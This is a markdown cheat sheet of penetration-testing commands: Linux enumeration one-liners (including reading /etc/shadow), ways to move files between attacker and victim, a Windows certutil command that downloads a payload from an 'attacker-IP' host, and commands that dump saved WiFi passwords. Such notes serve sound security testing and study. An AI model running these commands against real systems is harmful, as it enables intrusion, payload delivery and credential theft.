# Useful Commands

## Linux

- Bash
  - enumeration
    - system enumeration
      - `commands=( "hostname" "uname -a" "cat /proc/version" "cat /etc/issue" "lscpu" "ps aux" ) && for i in "${commands[@]}"; do printf "$i:\n" && $i && printf "\n"; done`
        - one liner for system enumeration
    - user enumeration
      - `commands=( "whoami" "id" "sudo -l" "cat /etc/passwd | cut -d : -f 1" "cat /etc/shadow" "cat /etc/group" "history" ) && for i in "${commands[@]}"; do printf "$i:\n" && $i && printf "\n"; done`
        - one liner for user enumeration
    - network enumeration
      - `commands=( "ifconfig" "ip a" "route" "ip route" "arp -a" "ip neigh" "netstat -ano") && for i in "${commands[@]}"; do printf "$i:\n" && $i && printf "\n"; done`
        - one liner for network enumeration
  - transfer files between attacker/victim and vice versa
    - `python -m http.server 80`
      - start HTTP server in current directory
    - `python -m pyftpdlib -p 21 --write`
      - start FTP server in current directory
    - `wget http://victim-IP/path/to/file`
      - download file from victim
  - dump WiFi network passwords
    - `sudo grep -r '^psk=' /etc/NetworkManager/system-connections/`
      - of all remembered WiFi networks
    - `nmcli dev wifi show-password`
      - of currently connected WiFi network
  - loop through array and execute command on elements inside
    - `for i in "${array[@]}"; do <command> "$i"; done`
- Python
  - virtual environments
    - `virtualenv --python=$(which python2) /path/to/newenv/folder/`
      - create for Python2
    - `source /path/to/venv/bin/activate`
      - activate

## Windows

- cmd
  - transfer files between attacker/victim and vice versa
    - `certutil -urlcache -f http://attacker-IP/path/to/payload payload`
      - download file to victim
    - `ftp attacker-IP`
      - connect to FTP server, to download/upload files
      - use anonymous login
  - dump WiFi network passwords
    - `netsh wlan show profiles name="$SSID" key=clear`
      - of all remembered WiFi networks
